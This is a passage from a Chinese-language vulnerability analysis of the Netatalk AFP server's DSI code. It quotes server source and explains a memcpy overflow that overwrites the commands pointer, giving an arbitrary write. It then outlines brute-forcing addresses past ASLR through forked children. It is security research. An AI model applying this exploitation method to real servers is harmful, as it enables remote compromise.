        <span class="n">len</span> <span class="o">=</span> <span class="n">dsi_stream_read</span><span class="p">(</span><span class="n">dsi</span><span class="p">,</span> <span class="n">block</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">len</span> <span class="p">)</span> <span class="p">{</span>
            <span class="cm">/* connection already closed, don't log it (normal OSX 10.3 behaviour) */</span>
            <span class="n">exit</span><span class="p">(</span><span class="n">EXITERR_CLOSED</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="o">||</span> <span class="p">(</span><span class="n">block</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">DSIFL_MAX</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">block</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">DSIFUNC_MAX</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_dsi</span><span class="p">,</span> <span class="s">"dsi_tcp_open: invalid header"</span><span class="p">);</span>
            <span class="n">exit</span><span class="p">(</span><span class="n">EXITERR_CLNT</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="cm">/* 读取DSI header剩下内容 */</span>
        <span class="n">stored</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">stored</span> <span class="o">&lt;</span> <span class="n">DSI_BLOCKSIZ</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">len</span> <span class="o">=</span> <span class="n">dsi_stream_read</span><span class="p">(</span><span class="n">dsi</span><span class="p">,</span> <span class="n">block</span> <span class="o">+</span> <span class="n">stored</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">block</span><span class="p">)</span> <span class="o">-</span> <span class="n">stored</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
                <span class="n">stored</span> <span class="o">+=</span> <span class="n">len</span><span class="p">;</span>
            <span class="k">else</span> <span class="p">{</span>
                <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_dsi</span><span class="p">,</span> <span class="s">"dsi_tcp_open: stream_read: %s"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
                <span class="n">exit</span><span class="p">(</span><span class="n">EXITERR_CLNT</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="cm">/* 将DSI header的内容依次赋值给dsi-header结构体 */</span>
        <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_flags</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
        <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_command</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_requestID</span><span class="p">,</span> <span class="n">block</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span>
               <span class="k">sizeof</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_requestID</span><span class="p">));</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_data</span><span class="p">.</span><span class="n">dsi_code</span><span class="p">,</span> <span class="n">block</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_data</span><span class="p">.</span><span class="n">dsi_code</span><span class="p">));</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_len</span><span class="p">,</span> <span class="n">block</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_len</span><span class="p">));</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_reserved</span><span class="p">,</span> <span class="n">block</span> <span class="o">+</span> <span class="mi">12</span><span class="p">,</span>
               <span class="k">sizeof</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_reserved</span><span class="p">));</span>
        <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">clientID</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_requestID</span><span class="p">);</span>

        <span class="cm">/* make sure we don't over-write our buffers. */</span>
        <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">cmdlen</span> <span class="o">=</span> <span class="n">min</span><span class="p">(</span><span class="n">ntohl</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_len</span><span class="p">),</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">server_quantum</span><span class="p">);</span>

        <span class="cm">/* 读取payload内容到commands指针指向的buf中 */</span>
        <span class="n">stored</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">stored</span> <span class="o">&lt;</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">cmdlen</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">len</span> <span class="o">=</span> <span class="n">dsi_stream_read</span><span class="p">(</span><span class="n">dsi</span><span class="p">,</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span> <span class="o">+</span> <span class="n">stored</span><span class="p">,</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">cmdlen</span> <span class="o">-</span> <span class="n">stored</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
                <span class="n">stored</span> <span class="o">+=</span> <span class="n">len</span><span class="p">;</span>
            <span class="k">else</span> <span class="p">{</span>
                <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_dsi</span><span class="p">,</span> <span class="s">"dsi_tcp_open: stream_read: %s"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
                <span class="n">exit</span><span class="p">(</span><span class="n">EXITERR_CLNT</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>

    <span class="p">......</span>

    <span class="cm">/* send back our pid */</span>
    <span class="k">return</span> <span class="n">pid</span><span class="p">;</span>
<span class="p">}</span>

</pre></table></code></div></div><h3 id="dsi_opensession">dsi_opensession()</h3><p>dsi_tcp_open()执行过后，数据已接收至DSI结构体中。之后返回dsi_getsession()函数，若当前是子进程，则调用opensession()函数处理，父进程就直接返回继续监听socket。dsi_opensession()函数首先根据commands[0]的内容决定处理逻辑，若为DSIOPT_ATTNQUANT，则执行memcpy，以commands[1]为大小，将commands[2]之后的内容拷贝至DSI结构体的attn_quantum成员变量（4 bytes）。之后程序会构建新的DSI消息到dsi-&gt;commands中，<strong>将server_quantum的值返回给客户端</strong>。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">dsi_opensession</span><span class="p">(</span><span class="n">DSI</span> <span class="o">*</span><span class="n">dsi</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="cm">/* this serves double duty. it must be 4-bytes long */</span>
  <span class="kt">int</span> <span class="n">offs</span><span class="p">;</span>

    <span class="p">......</span>

  <span class="cm">/* parse options */</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">cmdlen</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">])</span> <span class="p">{</span>
    <span class="k">case</span> <span class="n">DSIOPT_ATTNQUANT</span><span class="p">:</span>
      <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">attn_quantum</span><span class="p">,</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
      <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">attn_quantum</span> <span class="o">=</span> <span class="n">ntohl</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">attn_quantum</span><span class="p">);</span>

    <span class="k">case</span> <span class="n">DSIOPT_SERVQUANT</span><span class="p">:</span> <span class="cm">/* just ignore these */</span>
    <span class="nl">default:</span>
      <span class="n">i</span> <span class="o">+=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="cm">/* forward past length tag + length */</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="cm">/* let the client know the server quantum. we don't use the
   * max server quantum due to a bug in appleshare client 3.8.6. */</span>
  <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_flags</span> <span class="o">=</span> <span class="n">DSIFL_REPLY</span><span class="p">;</span>
  <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_data</span><span class="p">.</span><span class="n">dsi_code</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="cm">/* dsi-&gt;header.dsi_command = DSIFUNC_OPEN;*/</span>

  <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">cmdlen</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="mi">2</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">i</span><span class="p">));</span> <span class="cm">/* length of data. dsi_send uses it. */</span>

  <span class="cm">/* DSI Option Server Request Quantum */</span>
  <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">DSIOPT_SERVQUANT</span><span class="p">;</span>
  <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
  <span class="n">i</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">((</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">server_quantum</span> <span class="o">&lt;</span> <span class="n">DSI_SERVQUANT_MIN</span> <span class="o">||</span> 
	      <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">server_quantum</span> <span class="o">&gt;</span> <span class="n">DSI_SERVQUANT_MAX</span> <span class="p">)</span> <span class="o">?</span> 
	    <span class="n">DSI_SERVQUANT_DEF</span> <span class="o">:</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">server_quantum</span><span class="p">);</span>
  <span class="n">memcpy</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">i</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">i</span><span class="p">));</span>

  <span class="cm">/* AFP replaycache size option */</span>
  <span class="n">offs</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
  <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span><span class="p">[</span><span class="n">offs</span><span class="p">]</span> <span class="o">=</span> <span class="n">DSIOPT_REPLCSIZE</span><span class="p">;</span>
  <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span><span class="p">[</span><span class="n">offs</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
  <span class="n">i</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">REPLAYCACHE_SIZE</span><span class="p">);</span>
  <span class="n">memcpy</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span> <span class="o">+</span> <span class="n">offs</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">i</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">i</span><span class="p">));</span>
  <span class="n">dsi_send</span><span class="p">(</span><span class="n">dsi</span><span class="p">);</span>
<span class="p">}</span>

</pre></table></code></div></div><h3 id="afp_over_dsi">afp_over_dsi()</h3><p>之后，子进程返回至dsi_start()函数，调用afp_over_dsi()函数，该函数负责在当前socket下继续读取消息，并根据消息调用不同的处理函数，实现AFP协议的通信。由于函数体较大，这里只放出重要的内容。函数首先调用了<strong>dsi_stream_receive()</strong>，从当前socket读取新消息，之后根据消息内容返回DSI header中的dsi_command。根据dsi_command值的不同，走不同的switch分支，其中当dsi_command为DSIFUNC_CMD时，会以commands[0]为index，从afp_switch这个全局的函数数组中选择对应的处理函数，处理commands数据。afp_switch这个全局的变量，在初始时赋值为preauth_switch，其中只包含认证前能访问的函数，在通过认证之后，会变为postauth_switch，可访问认证后的函数。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">afp_over_dsi</span><span class="p">(</span><span class="n">AFPObj</span> <span class="o">*</span><span class="n">obj</span><span class="p">){</span>
    <span class="n">DSI</span> <span class="o">*</span><span class="n">dsi</span> <span class="o">=</span> <span class="p">(</span><span class="n">DSI</span> <span class="o">*</span><span class="p">)</span> <span class="n">obj</span><span class="o">-&gt;</span><span class="n">dsi</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">rc_idx</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">err</span><span class="p">,</span> <span class="n">cmd</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">function</span><span class="p">;</span>

    <span class="p">......</span>

    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
        <span class="cm">/* Blocking read on the network socket */</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="n">dsi_stream_receive</span><span class="p">(</span><span class="n">dsi</span><span class="p">);</span>

        <span class="k">switch</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="n">DSIFUNC_CLOSE</span><span class="p">:</span>
            <span class="n">LOG</span><span class="p">(</span><span class="n">log_debug</span><span class="p">,</span> <span class="n">logtype_afpd</span><span class="p">,</span> <span class="s">"DSI: close session request"</span><span class="p">);</span>
            <span class="n">afp_dsi_close</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span>
            <span class="n">LOG</span><span class="p">(</span><span class="n">log_note</span><span class="p">,</span> <span class="n">logtype_afpd</span><span class="p">,</span> <span class="s">"done"</span><span class="p">);</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

        <span class="k">case</span> <span class="n">DSIFUNC_TICKLE</span><span class="p">:</span>
            <span class="p">......</span>

        <span class="k">case</span> <span class="n">DSIFUNC_CMD</span><span class="p">:</span>
            <span class="n">function</span> <span class="o">=</span> <span class="p">(</span><span class="n">u_char</span><span class="p">)</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">afp_switch</span><span class="p">[</span><span class="n">function</span><span class="p">])</span> <span class="p">{</span>
                <span class="p">......</span>
                <span class="n">err</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">afp_switch</span><span class="p">[</span><span class="n">function</span><span class="p">])(</span><span class="n">obj</span><span class="p">,</span>
                                                  <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span><span class="p">,</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">cmdlen</span><span class="p">,</span>
                                                  <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">datalen</span><span class="p">);</span>
                <span class="p">......</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="p">......</span>
    <span class="p">}</span>
    <span class="p">......</span>
<span class="p">}</span>
</pre></table></code></div></div><h3 id="dsi_stream_receive">dsi_stream_receive()</h3><p>该函数从当前socket继续读取消息并保存在结构体中。具体地，先读取DSI header并保存到dsi-&gt;header结构体中，然后读取后续DSI payload保存到dsi-&gt;commands指向的buffer当中，长度由dsi-&gt;cmdlen指定。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">dsi_stream_receive</span><span class="p">(</span><span class="n">DSI</span> <span class="o">*</span><span class="n">dsi</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">block</span><span class="p">[</span><span class="n">DSI_BLOCKSIZ</span><span class="p">];</span>

  <span class="n">LOG</span><span class="p">(</span><span class="n">log_maxdebug</span><span class="p">,</span> <span class="n">logtype_dsi</span><span class="p">,</span> <span class="s">"dsi_stream_receive: START"</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">DSI_DISCONNECTED</span><span class="p">)</span>
      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

  <span class="cm">/* read in the header */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">dsi_buffered_stream_read</span><span class="p">(</span><span class="n">dsi</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">block</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">block</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">block</span><span class="p">))</span> 
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

  <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_flags</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
  <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_command</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_command</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

  <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_requestID</span><span class="p">,</span> <span class="n">block</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_requestID</span><span class="p">));</span>
  <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_data</span><span class="p">.</span><span class="n">dsi_doff</span><span class="p">,</span> <span class="n">block</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_data</span><span class="p">.</span><span class="n">dsi_doff</span><span class="p">));</span>
  <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_data</span><span class="p">.</span><span class="n">dsi_doff</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_data</span><span class="p">.</span><span class="n">dsi_doff</span><span class="p">);</span>
  <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_len</span><span class="p">,</span> <span class="n">block</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_len</span><span class="p">));</span>

  <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_reserved</span><span class="p">,</span> <span class="n">block</span> <span class="o">+</span> <span class="mi">12</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_reserved</span><span class="p">));</span>
  <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">clientID</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_requestID</span><span class="p">);</span>
  
  <span class="cm">/* make sure we don't over-write our buffers. */</span>
  <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">cmdlen</span> <span class="o">=</span> <span class="n">MIN</span><span class="p">(</span><span class="n">ntohl</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_len</span><span class="p">),</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">server_quantum</span><span class="p">);</span>

  <span class="cm">/* Receiving DSIWrite data is done in AFP function, not here */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_data</span><span class="p">.</span><span class="n">dsi_doff</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">LOG</span><span class="p">(</span><span class="n">log_maxdebug</span><span class="p">,</span> <span class="n">logtype_dsi</span><span class="p">,</span> <span class="s">"dsi_stream_receive: write request"</span><span class="p">);</span>
      <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">cmdlen</span> <span class="o">=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_data</span><span class="p">.</span><span class="n">dsi_doff</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="cm">/* 将header之后的payload读取到commands指向的内存中 */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">dsi_stream_read</span><span class="p">(</span><span class="n">dsi</span><span class="p">,</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span><span class="p">,</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">cmdlen</span><span class="p">)</span> <span class="o">!=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">cmdlen</span><span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

  <span class="n">LOG</span><span class="p">(</span><span class="n">log_debug</span><span class="p">,</span> <span class="n">logtype_dsi</span><span class="p">,</span> <span class="s">"dsi_stream_receive: DSI cmdlen: %zd"</span><span class="p">,</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">cmdlen</span><span class="p">);</span>

  <span class="k">return</span> <span class="n">block</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="p">}</span>

</pre></table></code></div></div><h1 id="0x01-漏洞">0x01 漏洞</h1><p>首先在dsi_opensession()函数中，会以commands[1]的值为大小，将commands[2]之后的内容通过memcpy拷贝至DSI结构体的attn_quantum成员变量（4 bytes）。这里可以看出，程序开发者本意是想拷贝4个字节内容至attn_quantum变量，但是由于memcpy长度是攻击者可自定义的（commands[1]，最大值为255），因此攻击者可以覆盖attn_quantum之后变量的内容。再来看一下结构体这部分的内容：</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="cp">#define DSI_DATASIZ       65536
</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">DSI</span> <span class="p">{</span>
    <span class="p">......</span>

    <span class="kt">uint32_t</span> <span class="n">attn_quantum</span><span class="p">,</span> <span class="n">datasize</span><span class="p">,</span> <span class="n">server_quantum</span><span class="p">;</span>
    <span class="kt">uint16_t</span> <span class="n">serverID</span><span class="p">,</span> <span class="n">clientID</span><span class="p">;</span>
    <span class="kt">uint8_t</span>  <span class="o">*</span><span class="n">commands</span><span class="p">;</span> <span class="cm">/* DSI recieve buffer */</span>
    <span class="kt">uint8_t</span>  <span class="n">data</span><span class="p">[</span><span class="n">DSI_DATASIZ</span><span class="p">];</span>    <span class="cm">/* DSI reply buffer */</span>
    <span class="kt">size_t</span>   <span class="n">datalen</span><span class="p">,</span> <span class="n">cmdlen</span><span class="p">;</span>

    <span class="p">......</span>

<span class="p">}</span> <span class="n">DSI</span><span class="p">;</span>
</pre></table></code></div></div><p>可以看出，攻击者可以覆盖attn_quantum，datasize，server_quantum，serverID，clientID，commands，以及data数组的部分内容。这里面commands为一个指针，通过注释可以看出，该指针为接收DSI payload数据部分的buffer，可以覆盖为任意的值。若之后可以向该指针指向buffer中读取数据，那就可以实现任意地址写。向指针指向buffer读取数据的动作位于dsi_stream_receive()函数中。因此，我们可以通过在同一个socket中发送两次DSI消息，实现任意地址写：第一次发送的消息，覆盖commands指针为目标地址（如free_hook地址）；第二次发送的消息，触发dsi_stream_receive()函数，向目标地址中写入任意内容，长度可由dsi-&gt;header.dsi_len指定。</p><h1 id="0x02-获取目标地址">0x02 获取目标地址</h1><p>由于程序开了全保护（包括ASLR PIE），因此lib地址、程序基址都是随机的，若想获取目标地址（如free_hook，malloc_hook等），需要我们首先通过地址泄露等漏洞获取libc基址。程序并未找到其余的地址泄露漏洞。</p><p>然而，虽然程序开启了地址随机化，但是由于每次新的TCP连接都是通过fork启动的子进程来处理，而子进程和父进程的地址空间是相同的，因此这个随机化实际上并不够随机，可以通过爆破的方式猜出地址。具体的方法是：从低位开始，依次覆盖commands指针的各个字节。当修改后的commands指针是一个可写的地址时，dsi_opensession()函数可以将server_quantum的值放进来并返回给我们，否则，子进程会由于访问不可写的地址而崩溃，socket异常。故，可以通过观察服务器是否给我们返回来确定当前我们是否爆破出一个合法的地址。</p><p>那么即使我们最终爆破出一个合法的地址，那么这个地址有什么含义？又如何通过该地址找到libc的基址呢？</p><p>首先先看一下commands指针的初始地址。该指针是由dsi_init_buffer()函数初始化的：</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="k">static</span> <span class="kt">void</span> <span class="nf">dsi_init_buffer</span><span class="p">(</span><span class="n">DSI</span> <span class="o">*</span><span class="n">dsi</span><span class="p">)</span>
<span class="p">{</span>
